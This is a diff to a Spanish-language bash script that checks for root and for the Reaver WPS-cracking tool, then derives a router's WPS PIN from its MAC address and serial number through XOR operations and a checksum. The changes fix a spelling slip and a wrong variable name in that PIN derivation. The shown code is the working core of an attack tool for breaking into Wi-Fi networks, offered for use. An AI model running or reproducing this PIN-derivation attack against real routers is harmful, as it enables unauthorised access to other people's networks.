@@ -36,7 +36,7 @@ echo -e "$orange▐█$white   Comprobando privilegios$grey"
 whoami | grep root || { echo -e "$red▐█   Error$grey - Se debe ejecutar el script con$yellow sudo$grey o$yellow su$grey para tener privilegios de administrador.  
 $red▐█   Exit.$grey"; exit 1; }
 echo -e "$orange▐█$white   Comprobando instalación reaver$grey"
-which reaver || { echo -e "$red▐█   Error$grey -$yellow Reaver$grey no está instalado.  Instala $yellow Reaver v1.6.1$grey (o duperior) desde:$white https://github.com/t6x/reaver-wps-fork-t6x$grey 
+which reaver || { echo -e "$red▐█   Error$grey -$yellow Reaver$grey no está instalado.  Instala $yellow Reaver v1.6.1$grey (o superior) desde:$white https://github.com/t6x/reaver-wps-fork-t6x$grey 
 $red▐█   Exit.$grey"; exit 1; } 
 reaver  &>> /tmp/versionreaver
 grep "Reaver v1.6." /tmp/versionreaver || { echo -e "$red▐█   Error$grey - Se debe actualizar reaver. Instala $yellow Reaver v1.6.1$grey (o duperior) desde:$white https://github.com/t6x/reaver-wps-fork-t6x$grey  
@@ -141,7 +141,7 @@ $orange▐█$white   Prensar <$orange CTRL$white +$orange C$white > para parrar
                 D4=$(printf '0x%X\n' $(( 0x$K2 ^ 0x$(echo $mac | cut -c 3))) | cut -c 3) 
                 D5=$(printf '0x%X\n' $(( 0x$(echo $seri | cut -c 4) ^ 0x$(echo $mac | cut -c 3))) | cut -c 3)
                 D6=$(printf '0x%X\n' $(( 0x$(echo $seri | cut -c 3) ^ 0x$(echo $mac | cut -c 4))) | cut -c 3)
-                D7=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $serial | cut -c 2))) | cut -c 3)
+                D7=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $seri | cut -c 2))) | cut -c 3)
                 conversion=$(printf '%d\n' 0x$D1$D2$D3$D4$D5$D6$D7)
                 string=$(printf '%07d\n' $((conversion%10000000)))
                 accum=$(($(echo "$string" | cut -c 1) * 3 + $(echo "$string" | cut -c 2) + $(echo "$string" | cut -c 3) * 3 + $(echo "$string" | cut -c 4) + $(echo "$string" | cut -c 5) * 3 + $(echo "$string" | cut -c 6) + $(echo "$string" | cut -c 7) * 3))
